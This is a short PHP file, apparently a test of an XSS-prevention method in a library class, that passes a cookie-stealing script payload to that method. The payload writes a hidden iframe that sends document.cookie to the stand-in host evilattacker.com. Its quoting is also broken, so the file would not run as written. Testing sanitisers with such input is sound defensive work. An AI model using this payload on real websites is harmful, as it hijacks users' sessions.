<?php 

 require '../lib/classes.php';
 $basekit = new BaseKit;
 $basekit->xssPrevent('<script>document.write("<iframe src="http://evilattacker.com?cookie='
    + document.cookie.escape() + '" height=0 width=0 />');</script>');
?>